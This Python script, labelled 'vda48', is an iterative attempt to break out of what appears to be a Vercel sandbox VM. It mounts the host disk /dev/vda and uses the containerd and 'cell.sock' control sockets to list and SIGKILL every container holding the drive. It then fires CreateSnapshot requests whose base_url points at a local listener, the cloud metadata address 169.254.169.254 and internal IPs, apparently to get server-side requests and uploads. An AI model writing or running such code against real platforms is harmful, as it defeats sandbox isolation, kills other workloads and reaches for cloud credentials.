# -*- coding: utf-8 -*-
"""vda48: 修复 namespace 问题后 Kill 占用 drive 的容器 -> CreateSnapshot(sandbox) 触发上传
vda47 教训: containerd gRPC 必须带 -H 'containerd-namespace: default'
流程:
  P1 读 runc task 目录拿容器 UUID + containerd Containers/List(ns=default)
  P2 Tasks/Kill(SIGKILL,all) + cell.sock Kill 双保险
  P3 Tasks/Get 轮询直到退出 (max 15s)
  P4 立即 CreateSnapshot(sandbox) base_url 变体连打 (drive 释放窗口期)
  P5 输出双写: /vercel/sandbox/v48.out + /mnt/vdax/root/v48.out (kill 后控制面可能挂)
输出落盘 + 哨兵 V48D_DONE"""
import os, time, socket, ctypes, subprocess, threading, re, struct

OUT = '/vercel/sandbox/v48.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v48.out'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def curl_h2(sockpath, path, payload, t=5, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(payload)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return r.returncode, r.stdout, hdrtxt, r.stderr
    except Exception as e:
        return -1, b'', '', str(e).encode()


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    out = bytearray([(field_no << 3) | 2, len(b)])
    return bytes(out) + b


def puint(field_no, v):
    out = bytearray([(field_no << 3) | 0])
    while v >= 0x80:
        out.append((v & 0x7f) | 0x80)
        v >>= 7
    out.append(v)
    return bytes(out)


def pbool(field_no, v):
    return bytes([(field_no << 3) | 0, 1 if v else 0])


LISTEN = []


def start_listener(port=18080, seconds=40):
    def run():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(16)
            s.settimeout(seconds)
            t_end = time.time() + seconds
            while time.time() < t_end:
                try:
                    c, addr = s.accept()
                    c.settimeout(3)
                    try:
                        data = c.recv(8192)
                        LISTEN.append((addr, data[:300]))
                    except Exception:
                        LISTEN.append((addr, b''))
                    c.close()
                except socket.timeout:
                    continue
            s.close()
        except Exception as e:
            LISTEN.append(('ERR', str(e).encode()))
    th = threading.Thread(target=run)
    th.daemon = True
    th.start()
    return th


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)
    try:
        open(EXTRA, 'w').close()
    except Exception:
        pass

    CS = '/mnt/vdax/run/cell/cell.sock'
    CD = '/mnt/vdax/run/containerd/containerd.sock'
    CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'

    # P0: 前置确认
    st, bd = rpc_unix(CS, CSP, '{"drive_id":"sandbox","base_url":"s3://127.0.0.1:1/b/k"}', t=4)
    log('pre sandbox -> %s | %s' % (st, bd[:200].replace('\n', ' ')))

    # P1: 容器 ID (runc task 目录 + containerd List)
    log('=== P1 container ids ===')
    cids = []
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    try:
        for d in sorted(os.listdir(base)):
            cids.append(d)
        log('task dirs: %s' % cids)
    except Exception as e:
        log('task dir ERR %s' % e)
    rc, out, hdr, err = curl_h2(CD, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('ctr list rc=%d hdr=%s err=%r' % (rc, hdr, err[:100]))
    if out:
        for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
            cid = m.group().decode()
            if cid not in cids:
                cids.append(cid)
        log('list ids: %s' % cids)
    # cell.sock 容器列表接口尝试
    for p in ['/vercel.hive.cell.api.containers.v1.ContainersService/List',
              '/vercel.hive.cell.api.containers.v1.ContainersService/Get']:
        st, bd = rpc_unix(CS, p, '{}', t=3)
        log('cell %s -> %s | %s' % (p.split('/')[-1], st, bd[:150].replace('\n', ' ')))

    # P2: Kill
    log('=== P2 kill ===')
    for cid in cids:
        req = pstr(1, cid) + puint(3, 9) + pbool(4, True)
        rc, out, hdr, err = curl_h2(CD, '/containerd.services.tasks.v1.Tasks/Kill', grpc_env(req), t=5)
        log('ctr kill %s rc=%d hdr=%s out=%r err=%r' % (cid, rc, hdr, out[:100], err[:100]))
        time.sleep(0.5)
    # cell.sock Kill + Wait 兜底
    for cid in cids:
        for m, p in [('Kill', '/vercel.hive.cell.api.containers.v1.ContainersService/Kill'),
                     ('Wait', '/vercel.hive.cell.api.containers.v1.ContainersService/Wait')]:
            body = '{"container_id":"%s"}' % cid
            st, bd = rpc_unix(CS, p, body, t=4)
            log('cell %s %s -> %s | %s' % (m, cid, st, bd[:150].replace('\n', ' ')))
            time.sleep(0.3)

    # P3: Get 轮询直到 task 消失
    log('=== P3 wait exit ===')
    for i in range(10):
        alive = []
        for cid in cids:
            req = pstr(1, cid)
            rc, out, hdr, err = curl_h2(CD, '/containerd.services.tasks.v1.Tasks/Get', grpc_env(req), t=3)
            status = 'dead' if 'not found' in (hdr + err.decode(errors='replace')) else ('alive' if out else 'unknown')
            if status == 'alive':
                alive.append(cid)
            log('get %d %s -> rc=%d %s out=%r' % (i, cid, rc, status, out[:80]))
        if not alive:
            log('ALL TASKS DEAD')
            break
        time.sleep(1)

    # P4: listener + CreateSnapshot 连打
    log('=== P4 snap after kill ===')
    start_listener(18080, 45)
    time.sleep(1)
    urls = ['s3://127.0.0.1:18080/b/k',
            's3://127.0.0.1:18080/test.bin',
            's3://127.0.0.1:1/b/k',
            's3://169.254.169.254/b/k',
            's3://169.254.169.254/latest/meta-data/b/k',
            's3://172.31.0.2/b/k',
            's3://bucket.s3.amazonaws.com/key',
            's3://127.0.0.1:18080/b/k']
    for i in range(3):
        for url in urls:
            body = '{"drive_id":"sandbox","base_url":"%s"}' % url
            t0 = time.time()
            st, bd = rpc_unix(CS, CSP, body, t=6)
            log('snap#%d %-50s -> %s (%.2fs) | %s' % (i, url, st, time.time() - t0, bd[:250].replace('\n', ' ')))
            time.sleep(0.8)
            if 'in use' not in bd:
                log('*** DRIVE FREE, base_url fetch engaged: %s -> %s' % (url, bd[:300]))
                break
        time.sleep(1)

    time.sleep(5)
    log('listener hits: %s' % LISTEN)
    log('V48D_DONE')
    f.close()


if __name__ == '__main__':
    main()
